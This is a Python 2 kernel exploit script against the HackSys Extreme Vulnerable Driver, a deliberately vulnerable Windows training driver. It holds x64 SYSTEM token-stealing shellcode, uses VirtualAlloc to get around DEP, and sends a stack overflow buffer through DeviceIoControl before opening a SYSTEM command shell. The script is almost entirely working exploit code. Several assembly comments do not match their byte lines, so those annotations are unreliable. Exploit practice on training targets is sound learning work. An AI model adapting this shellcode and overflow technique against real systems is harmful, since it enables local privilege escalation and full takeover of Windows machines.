import ctypes, sys, struct
from subprocess import *
from ctypes import *


#Set the kernel dll
kernel32 = windll.kernel32

#Get the Handle
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x00000003
FILE_ATTRIBUTE_NORMAL = 0x00000080
DWSharedMode = 0
hTemplateFile = None
lpSecurityAttributes = None
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", (GENERIC_READ|GENERIC_WRITE), DWSharedMode, lpSecurityAttributes, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, hTemplateFile)

if not hevDevice or hevDevice == -1:
		print '[+] Could not get handle. [*]'
		sys.exit(0)


#This will define the CTL_CODE
FILE_DEVICE_UNKNOWN = 0x00000022
FILE_ANY_ACCESS = 0x00000000
METHOD_NEITHER = 0x00000003
ctl_code = hex((FILE_DEVICE_UNKNOWN << 16) | (FILE_ANY_ACCESS << 14) | (0x800 << 2) | METHOD_NEITHER)
print "\n[*]     CTL code is: " + ctl_code + "      [*]" 

#System Token Stealing Payload
print "[*]     Stealing SYSTEM Token      [*]"

shellcode = bytearray(
	"\x48\x31\xc0" 				# 	xorq	%rax, %rax      | XOR RAX, RAX			; Zero Out RAX
	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00" 	# 	movq	%gs:392, %rax   | mov rax, [gs:188h]        	; Get nt!_KPCR.PcrbData.CurrentThread
	"\x48\x8b\x40\x70"			# 	movq	112(%rax), %rax	| mov rcx, rax                  ; Copy current process _EPROCESS structure
	"\x48\x89\xc1"				# 	movq	%rax, %rcx	| mov r11, rcx                  ; Store Token.RefCnt
	"\x49\x89\xcb"				# 	movq	%rcx, %r11	| mov r11, rcx                 	; Store Token.RefCnt
	"\x49\x83\xe3\x07"			# 	andq	$7, %r11	| and r11, 7		
	"\xba\x04\x00\x00\x00"			# 	movl	$4, %edx	| mov rdx, 4h                   ; WIN 7 SP1 SYSTEM process PID = 0x4
	"\x48\x8b\x80\x88\x01\x00\x00"		# 	movq	392(%rax), %rax	| mov rax, [rax + 188h]        	; Get nt!_EPROCESS.ActiveProcessLinks.Flink
	"\x48\x2d\x88\x01\x00\x00"		# 	subq	$392, %rax	| sub rax, 188h
	"\x48\x39\x90\x80\x01\x00\x00"		# 	cmpq	%rdx, 384(%rax)	| cmp[rax + 180h], rdx         	; Get nt!_EPROCESS.UniqueProcessId
	"\x75\xea"				# 	jne	-22 <.text+0x1f>| mov rdx, [rax + 208h]         	; Get SYSTEM process nt!_EPROCESS.Token
	"\x48\x8b\x90\x08\x02\x00\x00" 		#	movq	520(%rax), %rdx	| and rdx, 0fffffffffffffff0h	
	"\x48\x83\xe2\xf0"			# 	andq	$-16, %rdx	| or rdx, r11	
	"\x4c\x09\xda"				# 	orq	%r11, %rdx			
	"\x48\x89\x91\x08\x02\x00\x00"		# 	movq	%rdx, 520(%rcx)	| mov[rcx + 208h], rdx       	; Replace target process nt!_EPROCESS.Token
	"\x48\x83\xc4\x28" 			#	addq	$40, %rsp	| add rsp, 28					; Align the Stack
	"\xc3"					# 	retq
)

#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => None                         #
#   _In_      SIZE_T dwSize,          => dwSize (??) Shellcode Length #
#   _In_      DWORD flAllocationType, => flAllocationType (0x3000)    #
#   _In_      DWORD flProtect         => flProtect (0x40) Page Execute#
# );                                                                  #
#---------------------------------------------------------------------#
print "[*]  VirtualAlloc() to Bypass DEP  [*]"
lpAdress = None
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
ptr = kernel32.VirtualAlloc(lpAdress,c_int(len(shellcode)),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)
buff = (c_char * len(shellcode)).from_buffer(shellcode)
kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
final_exploit = struct.pack("<Q",ptr)

print "[*]      Sending Buffer!!!         [*]"
RDI = "B"*8
STACK = "C"*8
RBX = "D"*8
RSI = "E"*8
exploit = 'A' * 2048 + RDI + final_exploit
explLength = len(exploit)
kernel32.DeviceIoControl(hevDevice, 0x222003, exploit, explLength, None, 0, byref(c_ulong()), None)

#Spawn a NT System Shell
print "[*]   Popping a NT/System Shell!!! [*]"
Popen("start cmd", shell=True)
